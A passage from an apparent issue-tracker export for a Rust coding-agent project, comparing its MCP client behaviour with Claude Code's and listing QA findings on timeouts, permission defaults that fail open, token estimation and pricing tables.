
**Gap**: OC does not declare `elicitation` capability in the `initialize` params → server will not send elicitation requests to OC even if it would to CC. Filed as gap issue (see below).

---

### B2 — Tool discovery: `refresh_tools` / `fetchToolsForClient`

**CC**: `services/mcp/client.ts:1743-1998` — `fetchToolsForClient` (LRU-memoized, size 20, keyed by server name). Guards on `client.capabilities?.tools` being truthy; returns `[]` immediately if absent. Issues `tools/list` via SDK `client.request(…, ListToolsResultSchema)`. Results are `recursivelySanitizeUnicode`-cleaned. Each tool is wrapped in a `Tool` object with: qualified name `mcp__<server>__<tool>` (or bare name in `CLAUDE_AGENT_SDK_MCP_NO_PREFIX` mode), `isMcp:true`, `isConcurrencySafe`/`isReadOnly` from `tool.annotations.readOnlyHint`, `isDestructive` from `destructiveHint`, `isOpenWorld` from `openWorldHint`, description truncated to 2048 chars. `supports_tool_list_changed` is derived from `capabilities.tools.listChanged`.

**OC**: `src/mcp.rs:439-476` — `refresh_tools` issues `tools/list` unconditionally (no capability guard). Populates `self.tools: Vec<McpTool>`. Logs `list_changed_supported` from `capabilities.tools.list_changed`. `supports_tool_list_changed()` at line 468-473 reads `capabilities.tools.list_changed`. No LRU memoization; no Unicode sanitization; no annotation fields (readOnly, destructive, openWorld) extracted; no description truncation. Tool qualified name follows `mcp__<server>__<tool>` convention (line 667 of `McpManager::tools_as_openai_functions`).

**Input**: No explicit inputs — reads server-cached capability state. CC adds `{_meta: {claudecode/toolUseId}}` passthrough on call.

**Output**: Mutates `self.tools` in OC; returns `Vec<Tool>` in CC.

**Edge cases**:
- CC: `tools/list` failure logs and returns `[]`, never propagates error to caller.
- OC: `tools/list` failure propagates `McpError` to caller of `refresh_tools`.
- CC: SDK type may return `undefined` tools array; OC: `result.get("tools").and_then(|t| t.as_array())` also handles absence gracefully.
- OC: `refresh_tools` is called even when `capabilities.tools` is `None` (no guard at line 440). CC checks `client.capabilities?.tools` first.

**Error path**:
- CC: `fetchToolsForClient` wraps entire body in `try/catch`, logs error, returns `[]`.
- OC: Returns `McpError` propagated from `self.transport.request(…)`.

**Discovered gap**: OC calls `tools/list` unconditionally, ignoring the `capabilities.tools` gate. CC skips the call when `capabilities.tools` is falsy. Filed as gap.

---

### B3 — Tool call: `call_tool` / `callMCPTool`

**CC**: `services/mcp/client.ts:3029-3245` — `callMCPTool`. Issues `client.callTool({name, arguments, _meta}, CallToolResultSchema, {signal, timeout, onprogress})`. Runs its own `Promise.race` against a custom `timeoutMs` timer (default ~27.8 hours, overridden by `MCP_TOOL_TIMEOUT_MS` env var). Sets a 30-second interval logging "still running". On success, checks `result.isError`: if true, extracts text from `result.content[0].text` or `result.error` (legacy) and throws `McpToolCallError`. On success, calls `processMCPResult` which handles `toolResult` (legacy string), `structuredContent` (serialized JSON + schema), or `content[]` array (text/image/blob items). Images are resized/compressed via `maybeResizeAndDownsampleImageBuffer`. Large content may be persisted to disk and replaced with a file path reference. Auth errors (401/`UnauthorizedError`) throw `McpAuthError`. Session expiry (404/-32001 or -32000 on HTTP) throws `McpSessionExpiredError` and clears connection cache. `AbortError` (user Esc) returns `{content: undefined}` silently.

**OC**: `src/mcp.rs:487-502` — `McpServer::call_tool`. Pre-checks `self.tools.iter().any(|t| t.name == name)`; returns `McpError::ToolNotFound` if absent. Issues `tools/call` with `{name, arguments}`. Returns raw `Value` (the full JSON-RPC result). No `isError` flag inspection. No image handling. No large-output persistence. No session-expiry detection. No progress callbacks. No per-call `_meta` passthrough. Timeout via `McpManager::call_tool_with_timeout` wraps with `tokio::time::timeout` returning `McpError::Timeout`.

**Input**:
- CC: `{client, tool:string, args:Record<string,unknown>, meta?, signal:AbortSignal, onProgress?}`.
- OC: `(name: &str, arguments: Value)` — no signal, no meta, no progress.

**Output**:
- CC: `{content: MCPToolResult, _meta?, structuredContent?}` — normalized, image-compressed, possibly file-persisted.
- OC: raw `Value` (unprocessed JSON-RPC result object).

**Edge cases**:
- CC: `isError:true` in result → `McpToolCallError` (not a transport error; server responded with a tool-level error).
- OC: `isError` field in result is not inspected; caller receives the error payload as success `Value`.
- CC: Binary/image blobs are resized and delivered as `image` content blocks.
- OC: No binary handling; `read_resource` (not `call_tool`) handles blob/text distinction.

**Error path**:
- CC: 401 → `McpAuthError`; -32001/session → `McpSessionExpiredError` + cache clear + retry; AbortError → silent `undefined`.
- OC: All errors surface as `McpError` variants: `Transport`, `Protocol`, `ToolNotFound`, `Timeout`. No auth-error or session-expiry distinctions.

**Discovered gap**: OC does not inspect `isError` in tool call results. Filed as gap.

---

### B4 — Resource capability gate: `list_resources` / `fetchResourcesForClient`

**CC**: `services/mcp/client.ts:2000-2031` — `fetchResourcesForClient` (LRU-memoized). Guards on `client.capabilities?.resources` truthy. If absent, returns `[]` immediately — no wire call. Issues `{method:'resources/list'}` validated against `ListResourcesResultSchema`. Attaches `server: client.name` to each resource. Failure logs and returns `[]`.

**OC**: `src/mcp.rs:515-542` — `McpServer::list_resources`. Guards on `self.has_resources()` (line 516), which checks `self.capabilities.resources.is_some()` (line 507). Returns `Ok(Vec::new())` immediately if absent — correct behavior, matching CC. Issues `resources/list` with `Some(json!({}))` as params (CC sends no params object).

**Input**: None (CC: keyed by client reference).

**Output**: `Vec<McpResource>` (OC) / `ServerResource[]` with `.server` field (CC).

**Edge cases**:
- CC: `result.resources` undefined → returns `[]` (no panic).
- OC: `result.get("resources").and_then(…).unwrap_or_default()` → same safe fallback.
- CC: Capability check is on `capabilities.resources` truthy (any object). OC: `capabilities.resources.is_some()` — equivalent.
- OC sends `Some(json!({}))` as params; CC sends no params. MCP spec treats params as optional; difference is benign but a divergence.

**Error path**:
- CC: Returns `[]` on error (logged). Never propagates.
- OC: Propagates `McpError` to caller; single-server `list_resources` failure aborts; multi-server path (in `McpManager::list_resources` line 757-768) catches per-server errors and logs, continuing for other servers.

**Assessment**: This behavior is substantially correct in OC. Minor param divergence noted.

---

### B5 — Unknown / non-standard server error code surfacing

**CC**: `services/mcp/client.ts:1955-1966` — in `callMCPTool` catch block: if `error.constructor.name === 'McpError'` and `'code' in error` and `typeof error.code === 'number'`, wraps as `TelemetrySafeError` with message `McpError <code>`. The numeric code (e.g., -32000 ConnectionClosed, -32001 RequestTimeout, arbitrary server codes) is preserved in the error message. Upstream: SDK throws `McpError` with the raw code from the JSON-RPC error object.

**OC**: `src/mcp.rs:249-263` — JSON-RPC error path in `StdioTransport::request`: `McpError::Protocol(format!("RPC error {}: {}{}", error.code, error.message, data_info))`. The numeric code is embedded in the protocol error string. `HttpTransport::request` at line 330: `McpError::Protocol(format!("RPC error {}: {}", error.code, error.message))` — data field dropped.

**Input**: JSON-RPC response with `error: {code: <any i64>, message: string, data?: Value}`.

**Output**: An error is returned — not panicked, not silently swallowed. The code is surfaced in the error message.

**Edge cases**:
- Unknown code (not -32600, -32700, etc.): still formatted as `RPC error <n>: <message>`. No special mapping needed.
- CC maps -32000 to "session expired" logic in specific transport contexts (HTTP/claudeai-proxy).
- OC: code -32000 is treated identically to any other code — no special session-expiry handling.

**Error path**:
- OC: `McpError::Protocol` is returned via `?` propagation. No panic path.
- CC: Caught in `callMCPTool` catch, re-thrown as telemetry-safe wrapper with code in message.

**Assessment**: OC correctly surfaces unknown codes without panicking. Missing: HTTP transport drops the `data` field from JSON-RPC errors (line 330 vs line 255-259 of stdio path which includes it). Filed as gap.

---

### B6 — Transport disconnect mid-call returns explicit error

**CC**: `services/mcp/client.ts:1234-1402` — connection-drop detection. `client.onerror` handler intercepts terminal errors: `ECONNRESET`, `ETIMEDOUT`, `EPIPE`, `EHOSTUNREACH`, `ECONNREFUSED`, `Body Timeout Error`, `terminated`, `SSE stream disconnected`, `Failed to reconnect SSE stream`. After `MAX_ERRORS_BEFORE_RECONNECT` (3) consecutive terminal errors, calls `closeTransportAndRejectPending()` which calls `client.close()`. SDK's `close()` rejects all pending `callTool` promises with `McpError -32000 "Connection closed"`. `onclose` clears the memoize cache so next call reconnects. SSE "Maximum reconnection attempts" also triggers `closeTransportAndRejectPending`. HTTP 404/-32001 triggers session-expiry path (`McpSessionExpiredError`, cache clear, retry).

**OC**: `src/mcp.rs:195-213` — `StdioTransport::request`: stdin write failures (`write_all`, flush) return `McpError::Transport`. Stdout read failure returns `McpError::Transport`. `HttpTransport::request` at line 313-319: `reqwest` send failure → `McpError::Transport`; HTTP non-2xx → `McpError::Transport`. In both: pending request is in a sequential lock (`reader: Mutex<BufReader<…>>`), so concurrent calls are serialized — only one in-flight at a time. No reconnection logic; no `onclose`/`onerror` hooks; no error-count-based escalation.

**Input**: In-flight `transport.request(…)` call when the transport layer fails.

**Output**: `McpError::Transport(String)` — explicit error, no panic.

**Edge cases**:
- OC: `StdioTransport` holds a single `Mutex<BufReader>`, so concurrent callers queue; a disconnect mid-read returns an IO error and subsequent callers will also error on the poisoned reader.
- CC: SDK handles concurrent requests with separate response routing; a disconnect rejects all pending promises simultaneously.
- OC: No reconnection attempt after transport error; caller must create a new `McpManager::connect_stdio/http`.
- CC: `onclose` clears the memoize cache; next `connectToServer` call transparently reconnects.

**Error path**:
- OC: `McpError::Transport` propagated up from the transport, through `call_tool`, to the `McpManager` caller.
- CC: `McpError -32000 "Connection closed"` surfaces from pending `callTool` futures when the SDK transport is closed.

---

## Additional discovered gaps

The four gaps from the issue brief plus newly discovered ones:

### Gap A (from brief): MCP elicitation missing
CC (`services/mcp/elicitationHandler.ts:68-313`, `client.ts:1191-1197`, `client.ts:999`) registers an `ElicitRequestSchema` handler on the SDK client. OC does not declare `elicitation` in `initialize` capabilities (`src/mcp.rs:382-389`) and has no elicitation handler. Servers that send elicitation requests will receive no response from OC.

### Gap B (from brief): MCP enterprise IdP OAuth (XAA) missing
CC (`services/mcp/xaa.ts`, `services/mcp/xaaIdpLogin.ts`) implements RFC 8693 token exchange + RFC 7523 JWT bearer grant for headless enterprise SSO. OC has no OAuth token management of any kind.

### Gap C (from brief): Per-server channel permissions missing
CC (`services/mcp/channelPermissions.ts`) races permission approvals against channel servers (Telegram, iMessage, Discord) that emit `notifications/claude/channel/permission` events. OC has no permission relay subsystem.

### Gap D (from brief): InProcessTransport missing
CC (`services/mcp/InProcessTransport.ts:1-65`) provides `createLinkedTransportPair()` used for in-process MCP servers (Computer Use, Chrome MCP, SDK-mode servers). OC `McpTransport` trait has no in-process implementation.

### Gap E (discovered): `isError` flag not inspected in tool call results
**CC**: `client.ts:3124-3148` checks `result.isError === true` and throws `McpToolCallError`. **OC**: `src/mcp.rs:499-501` returns the raw `Value` without checking `isError`. Callers receive a payload that contains an error description as a success value.

### Gap F (discovered): HTTP transport drops `data` field from JSON-RPC errors
**CC**: SDK preserves the full `data` field in `McpError`. **OC**: `HttpTransport::request` at `src/mcp.rs:329-332` formats error as `"RPC error {code}: {message}"` — `data` is discarded. `StdioTransport::request` at `src/mcp.rs:249-259` does include it. Asymmetry means HTTP callers lose structured error context.

### Gap G (discovered): `refresh_tools` ignores `capabilities.tools` gate
**CC**: `client.ts:1748-1751` returns `[]` without a wire call if `!client.capabilities?.tools`. **OC**: `src/mcp.rs:439-440` calls `tools/list` unconditionally. This is a spurious RPC call and will produce a JSON-RPC error if the server does not support the tools capability.

### Gap H (discovered): No connection-establishment timeout
**CC**: `client.ts:1048-1077` races `client.connect(transport)` against `getConnectionTimeoutMs()` ms (env-configurable). **OC**: `McpServer::new` → `initialize` → `transport.request("initialize", …)` has no timeout (the `Duration` timeout is only on `McpManager::call_tool_with_timeout`, not on handshake). A non-responsive server hangs the process indefinitely.

### Gap I (discovered): No reconnection / cache-clear after disconnect
**CC**: `client.ts:1374-1401` clears the memoize cache in `onclose` so the next `connectToServer` call reconnects transparently. **OC**: `McpManager` holds `HashMap<String, McpServer>` with no `onclose` hook; a disconnected server stays in the map with a broken transport; future calls return `McpError::Transport` with no self-healing.

### Gap J (discovered): SSE, WebSocket, Streamable-HTTP transports missing
**CC**: `client.ts:619-960` supports 8 transport types: `stdio`, `sse`, `sse-ide`, `ws`, `ws-ide`, `http` (StreamableHTTP), `sdk`, `claudeai-proxy`. **OC**: `src/mcp.rs` implements only `StdioTransport` (line 139) and `HttpTransport` (line 276, plain JSON-RPC POST — not Streamable HTTP). SSE, WebSocket, and the full MCP Streamable HTTP spec are absent.

### Gap K (discovered): HTTP transport sends plain JSON-RPC POST, not Streamable-HTTP
**CC**: `client.ts:784-865` uses `StreamableHTTPClientTransport` (SSE-capable bidirectional streaming, `application/json, text/event-stream` Accept header). **OC**: `HttpTransport::request` at `src/mcp.rs:297-337` sends a plain `POST` with `Content-Type: application/json` and deserializes a single JSON response — incompatible with MCP's Streamable HTTP spec which multiplexes server-sent events over the same connection. This makes the HTTP transport non-compliant with MCP 2025-03-26.

## Done when

- This issue body has been edited to contain a markdown spec, one section per behavior above
- Each behavior section names the function(s) on both sides (or marks the OC side missing)
- Every gap above has been filed as its own issue and linked here
- The matching Phase 2 issue is unblocked

6e7972a2-411b-40b9-9460-1df8f91190d1.author: lOrm
6e7972a2-411b-40b9-9460-1df8f91190d1.content:
## OC current-behavior spec (HEAD ba62e46d) — Phase-2 pin

Describes what `src/mcp.rs` does TODAY; future refactors must preserve these contracts.

## B1 — `McpServer::new` handshake (`initialize` + `tools/list`)
**OC location**: `src/mcp.rs:778-855` (`new` → `new_with_config`), `:858-911` (`initialize`).
**Contract**: `(name: &str, transport: Box<dyn McpTransport>) -> Result<McpServer, McpError>`. Default config (`McpServerConfig::new()`) uses a 30 s deadline. The struct starts with `info: None`, `capabilities: McpCapabilities::default()`, `tools: Vec::new()`, then drives `initialize()` and `refresh_tools()` either (a) raw when `initialize_timeout_secs == 0`, or (b) each wrapped in `tokio::time::timeout(deadline, …)`. `initialize()` sends `protocolVersion: "2024-11-05"`, declares `capabilities.roots.listChanged: true` (no `elicitation`, no `sampling`), `clientInfo.name = "openclaudia"`, `clientInfo.version = env!("CARGO_PKG_VERSION")`. `serverInfo` and `capabilities` parse via `.ok()` / `.unwrap_or_default()` — malformed metadata silently falls back to defaults. A `notifications/initialized` request follows; its `Result` is discarded with `.ok()`.
**Edge cases**: Timeout `0` disables the deadline. On timeout the inner future is cancelled (drops in-flight `read_until`); the child process is NOT killed. `notifications/initialized` returning `Err` is intentionally swallowed.
**Error paths**: `McpError::Timeout { phase: "initialize" }` and `McpError::Timeout { phase: "tools/list" }` on deadline expiry; otherwise transport's `McpError` propagates.
**Invariants**: `protocolVersion` is hard-coded — never negotiated. `clientInfo` is identical across all servers.

## B2 — `refresh_tools` capability-gated discovery
**OC location**: `src/mcp.rs:938-974`; gate via `has_tools_capability()` `:920-923`.
**Contract**: `&mut self -> Result<(), McpError>`. If `!self.has_tools_capability()` (i.e. `capabilities.tools.is_none()`), log `debug!` and return `Ok(())` with no wire call. `self.tools` is LEFT UNTOUCHED — a previous successful refresh survives. Otherwise sends `tools/list` with `None` params. `result.get("tools").and_then(as_array)` is `serde_json::from_value::<McpTool>(…).ok()` and `filter_map`-collected — malformed entries are silently dropped. A single `info!` logs `tool_count` and `list_changed_supported` derived from `capabilities.tools.list_changed`.
**Edge cases**: Result with no `tools` key or non-array value → `self.tools` unchanged (no clear). Tool deserialization is best-effort.
**Error paths**: `self.transport.request("tools/list", None).await?` propagates verbatim; no retry/fallback.

## B3 — `call_tool` with `isError` envelope inspection
**OC location**: `src/mcp.rs:1007-1057`.
**Contract**: `(name: &str, arguments: Value) -> Result<Value, McpError>`. Pre-flight: `self.tools.iter().any(|t| t.name == name)` — on miss returns `McpError::ToolNotFound(name)` without making a wire call. Otherwise sends `tools/call` with `params = json!({"name": name, "arguments": arguments})`. Per fix #625, inspects `result.get("isError").and_then(as_bool).unwrap_or(false)`. If true, extracts `content[*].text` via `arr.iter().find_map(...)` and returns `McpError::ToolReportedError { message }`. If `content` is missing or contains no text, message defaults to `"MCP tool '{name}' returned isError with no content"`. Otherwise returns the raw result `Value`.
**Edge cases**: `isError: false`, absent, or non-boolean → treated as success. Pre-flight uses the locally cached `tools` list — a tool registered after the last `refresh_tools` is not callable.
**Error paths**: `ToolNotFound`, `ToolReportedError`, or transport variant.

## B4 — `list_resources` / `has_resources` capability gate
**OC location**: `src/mcp.rs:1061-1097`. `has_resources()` is a `const fn` checking `capabilities.resources.is_some()`.
**Contract**: If `!has_resources()`, returns `Ok(Vec::new())` with no wire call. Otherwise sends `resources/list` with `Some(json!({}))` as params (NOT `None`). The `resources` array is `filter_map`-deserialized into `Vec<McpResource>`; missing array → `Vec::new()`.
**Edge cases**: Empty `{}` is sent on the wire — not `null`. Resource entries that fail to deserialize are silently dropped.
**Error paths**: Transport errors propagate; missing `resources` field yields `Ok(vec![])`.

## B5 — `read_resource` text-first then blob fallback
**OC location**: `src/mcp.rs:1104-1135`.
**Contract**: Sends `resources/read` with `params = json!({"uri": uri})`. Walks `result.contents`: (a) collects all `text` fields and joins with `\n`; (b) if none, collects all `blob` fields and joins with `\n`; (c) if both empty, returns `result.to_string()` (full JSON-RPC result serialized).
**Edge cases**: Mixed text+blob → only text items are returned. No capability gate — call is unconditional even when the server did not advertise `resources` capability (asymmetric with `list_resources`).
**Error paths**: Transport error propagated.

## B6 — Transport JSON-RPC error surface
**OC location**: `StdioTransport::request` `src/mcp.rs:374-540`, `HttpTransport::request` separately.
**Contract**: JSON-RPC error responses format as `McpError::Protocol("RPC error {code}: {message}{data_info}")`; stdio appends `" data: {data}"` when `error.data` is present, HTTP variant drops `data`. ID mismatch yields a dedicated variant (fix #701). Oversized stdio response (`> MAX_RESPONSE_SIZE` without newline) returns `McpError::Transport(...)` with an stderr snippet appended. EOF before first byte returns `McpError::Transport("MCP server closed stdout before responding{snippet}")`.
**Edge cases**: Stdio uses a single `Mutex<BufReader>` plus a `request_lock` (fix #732) — the write+read transaction is serialized so the server sees one in-flight request at a time. Oversized line is detected BEFORE allocation via `Take::read_until` (fix #445). Request IDs are monotonic `AtomicU64::fetch_add(1, SeqCst)` starting at 1 — id 0 is never sent.
**Error paths**: `McpError::Transport(String)` for IO + size violations; `McpError::Protocol(String)` for parse + RPC errors; `McpError::Timeout { phase }` for handshake only (steady-state stdio has no built-in timeout; HTTP has `HTTP_REQUEST_TIMEOUT`).
**Invariants**: No reconnection / cache-clear after disconnect — a broken transport remains in `McpManager`'s map until rebuilt via `ConnectionSpec::build_transport()` (fix #629).

c37b8c81-71db-4fc4-9da4-0a0d5d455f39.title: QA: lsp.rs child.wait() after shutdown has no timeout (deadlocks on misbehaving server)
c37b8c81-71db-4fc4-9da4-0a0d5d455f39.description:
## Severity
Minor
## Dimension
concurrency
## Location
src/tools/lsp.rs:226-229
## Violation
After issuing `shutdown` + `exit` notifications, `run_lsp_request` calls `child.wait()` with no timeout. A misbehaving language server (or one that received malformed input earlier and is wedged) will block this call forever — and because `execute_lsp` is called synchronously from the tool dispatch loop, the entire agent stalls.

Quoted (lsp.rs:226-229):
```
    // Shutdown
    send_lsp_message(&mut stdin, "shutdown", 3, json!(null))?;
    send_lsp_notification(&mut stdin, "exit", json!(null))?;
    let _ = child.wait();
```

The `let _` also discards any exit status; we cannot tell if the server crashed.
## Mandated refactor
1. Spawn a watchdog thread that calls `child.kill()` after a bounded shutdown deadline (~2s).
2. Or use `wait_timeout` crate / `nix::sys::wait::waitpid(WNOHANG)` polling with a deadline.
3. Surface the wait result so a server crash during shutdown is logged.
## Filed from QA review dispatch

c42c46c3-e478-462b-82c0-619de43b8589.title: Permissions bypass: permission check skipped when AppConfig.permissions.enabled=false by default
c42c46c3-e478-462b-82c0-619de43b8589.description:
Steps to reproduce:
1. 

Expected: 
Actual: 

**Dimension**: Security and Access (Least Privilege / Secure Defaults)

**Location**:
- src/config/permissions.rs:7-17 (PermissionsConfig: enabled defaults to false)
- src/permissions.rs:112-114 (check() returns Allowed immediately if !enabled)

**Violation**: The permission system defaults to DISABLED. PermissionsConfig::default() leaves `enabled: false`, so a fresh install with no permissions block in config.yaml means every bash/edit/write tool call is auto-allowed without prompting. This contradicts the 'principle of least privilege' and contradicts Claude Code's default behavior (which is prompt-on-first-use).

Additionally:
- default_allow is stored as `Vec<String>` of glob patterns matched against the tool's first arg. There is NO toolname qualification in default_allow entries (unlike PermissionRule which has .tool). A pattern 'ls *' matches any Bash command AND any Edit/Write path that happens to match — cross-tool contamination.
- The check() flow short-circuits on enabled=false BEFORE even consulting persisted_rules — a user's previously-saved Deny rules are silently ignored when the system is disabled.

**Mandated Refactor**:
1. Flip default to `enabled: true` OR add an explicit 'dangerously_disable_permissions' field that emits a startup warning.
2. Change default_allow entries from Vec<String> to Vec<{tool: String, pattern: String}> so each entry is tool-scoped.
3. Persisted Deny rules MUST be honored even when enabled=false — move the enabled gate below the persisted Deny check.
4. Document the default posture in README and surface it at first-run.

c465e740-cba5-41e8-a8c9-1cd700e496c0.title: Token warning threshold cast uses lossy f32 to f64 conversion with cast_possible_truncation allow
c465e740-cba5-41e8-a8c9-1cd700e496c0.description:
## Severity
Trivial
## Dimension
complexity
## Location
src/proxy.rs:629-648
## Violation
record_turn_estimate computes utilization with two awkward integer/float casts:

  let utilization_pct_x10 = estimated_input.saturating_mul(1000).checked_div(context_window).unwrap_or(0);
  let usage_pct_f64 = f64::from(utilization_pct_x10 as u32) / 10.0;
  ...
  let threshold_tokens = (f64::from(context_window as u32) * f64::from(warn_threshold)) as usize;

For context_window > u32::MAX (a future model with 5B-token context), the as u32 truncates silently. warn_threshold is f32 but used in f64 arithmetic — a sub-percent threshold loses ~7 digits of precision. The allow(cast_possible_truncation) annotation is the LARP that masks a real future bug.
## Mandated refactor
Compute threshold via integer math: threshold_tokens = context_window * (warn_threshold * 1000.0).round() as usize / 1000. Use u128 if guarding against future context-window growth.
## Filed from QA review dispatch

c57d20ce-6aca-47a0-a626-3ca986dca915.title: QA: lsp.rs uses magic 500ms sleep for server warm-up (race-prone)
c57d20ce-6aca-47a0-a626-3ca986dca915.description:
## Severity
Minor
## Dimension
concurrency
## Location
src/tools/lsp.rs:190-191
## Violation
After sending `textDocument/didOpen`, the code sleeps a fixed 500ms then sends the real request. There is no synchronization with the server — slow machines, large files, or cold-started rust-analyzer (which can take 30+ seconds to index) will receive the request before they've finished processing, producing empty/wrong answers. Fast machines pay the latency tax unnecessarily.

Quoted (lsp.rs:190-191):
```
    // Give server a moment to process the file
    std::thread::sleep(std::time::Duration::from_millis(500));
```

Comments like "give server a moment" are a tell that the contract was never specified.
## Mandated refactor
1. Use LSP's progress reporting (`$/progress` with `WorkDoneProgressEnd`) to detect when indexing completes, OR
2. Issue the request immediately and retry on the server's well-known "content modified" / empty response codes, OR
3. At minimum, make the timeout configurable per-language (rust-analyzer needs MUCH more than 500ms for any non-trivial project).
## Filed from QA review dispatch

c644f364-ad5f-4583-8b34-6c7221b4c3c1.title: QA: PermissionManager::extract_target hard-codes three tool names; new tools fail-open
c644f364-ad5f-4583-8b34-6c7221b4c3c1.description:
## Severity
Major
## Dimension
decoupling
## Location
src/permissions.rs:270-302
## Violation
`extract_target` exhaustively enumerates only three permission-relevant
tools:
```rust
match tool_name {
    "bash" => { ... }
    "edit_file" => { ... }
    "write_file" => { ... }
    // Read-only tools, task tools, and memory tools don't need permission checks
    _ => None,
}
```
The `_ => None` catch-all means **any tool added elsewhere in the code
base bypasses permission checks entirely**. The list lives in
permissions.rs; the tool definitions live in tools.rs (per CLAUDE.md
architecture map). There is no compile-time link between the two. A
contributor adding `delete_file`, `chmod`, `run_subprocess`, or an MCP
tool gets no warning — just silent allow-all. This is an OCP violation
(open for modification, not extension) and a security gap.
## Mandated refactor
Invert the dependency: have each tool register its permission target via
a trait method `fn permission_target(&self, args: &Value) ->
Option<PermissionTarget>` that the `PermissionManager` queries. Or
replace the `match` with a `HashMap<&str, TargetExtractor>` populated by
a registration macro in tools.rs at compile time. Add a `#[deny]` or
build-time assertion that every tool name registered in `tools.rs`
appears in the permission table.

c648b1d6-7500-4d1c-9d44-e3b06da9d638.title: estimate_tokens uses magic constants *2, /3, *13/10 with no derivation or test pin
c648b1d6-7500-4d1c-9d44-e3b06da9d638.description:
## Severity
Trivial
## Dimension
naming
## Location
src/compaction.rs:208-230 (estimate_tokens)
## Violation
The estimator mixes three magic numbers with no symbolic name or rationale:

```rust
let char_estimate = char_count / 4;
let word_estimate = word_count * 13 / 10;
let base_estimate = (char_estimate * 2 + word_estimate) / 3;
let non_ascii_adjustment = non_ascii_count / 2;
base_estimate + non_ascii_adjustment
```

`/ 4`, `* 13 / 10` (= 1.3 tokens per word), `* 2 + ... / 3` (weighted average biased toward char count), and `/ 2` (half of non-ASCII count) are all unjustified. The accuracy gap relative to a real tokenizer is the proximate cause of #321 (compaction firing late on CJK input). The doc comment says "approximate" but does not cite a corpus or tolerance.

Two specific concerns:
1. Future maintainers cannot tell which constant to nudge when accuracy needs to improve — `4` vs `1.3` vs `1/2` are all related guesses with no derivation.
2. No property test asserts the estimate is within ±N% of a known-truth tokenizer for the calibration corpus, so adjustments will be flying blind.
## Mandated refactor
1. Promote the constants to named, doc-commented consts: `CHAR_TO_TOKEN_DIVISOR`, `WORD_TO_TOKEN_NUMERATOR/DENOMINATOR`, `NON_ASCII_TOKEN_BOOST_DIVISOR`, `CHAR_WEIGHT_NUMERATOR/DENOMINATOR`.
2. Cite the source (anthropic-tokenizer empirical run, etc.) in the doc comment.
3. Add a property test fixture (`tests/fixtures/tokenizer_corpus.json`) with text→ground-truth-token-count pairs and assert estimate is within ±20%.
4. Long-term tracked by #321 (tiktoken integration); this issue is the cleanup that makes #321's calibration safer.
## Filed from QA review dispatch

c66e3f12-8c10-4b11-83bf-b01c7962d92d.title: Pricing table: hardcoded model strings drift from live rates, inference via substring match is fragile
c66e3f12-8c10-4b11-83bf-b01c7962d92d.description:
Current state: 

Desired state: 

Reason: 

Dimension: Architectural Alignment (2) / SOLID/OCP (3.2)

Location: src/session/pricing.rs:20-131 (get_pricing).

Violation: A 17-branch if/else-if chain (cyclomatic complexity ~18, exceeds the 15 threshold from 3.5) doing substring matches on model names to look up prices.

1. OCP violation: adding a new model requires editing a central function. SRP violation: pricing data and pricing-selection logic are fused.
2. Ordering hazards: 'gpt-5.2' branch at line 38 must come BEFORE 'gpt-5' branch at line 53 to avoid shadowing. 'gemini-2...flash' at 103 must come before 'gemini-2' at 108. Any reorder breaks pricing silently.
3. Drift: there is no source-of-truth for these numbers. Anthropic, OpenAI, Google, DeepSeek, Qwen all update prices independently; this file will be wrong in 3 months. calculate_cost feeds directly into user-facing cost displays and budget limits — wrong pricing means wrong budget enforcement.
4. Cache-write multiplier hardcoded at 1.25x (line 148) — Anthropic cache writes are 1.25x input for ephemeral and 2x for 1hr caches. The code assumes ephemeral, so 1-hour cache writes are UNDER-billed by 60 percent.
5. calculate_cost returns None for unknown models — which masks as 'free' in downstream code that does .unwrap_or(0.0).

Mandated Refactor:
1. Replace the if-chain with a table: static PRICING_TABLE: &[(prefix_pattern, ModelPricing)]. Iterate and return the first match. Makes ordering explicit and testable.
2. Load the table from a versioned YAML file (alongside existing config/mcp configs), with the struct literal as the embedded fallback. Lets users update pricing without a recompile.
3. Split cache_write_multiplier into ephemeral_5m and ephemeral_1hr fields. Pick based on the request's cache_control TTL.
4. calculate_cost returns Result<f64, PricingError::UnknownModel(String)> — force caller to handle missing pricing explicitly, not swallow as zero.
5. Add a property test: for every registered model name across providers.rs and config.rs, pricing must resolve.
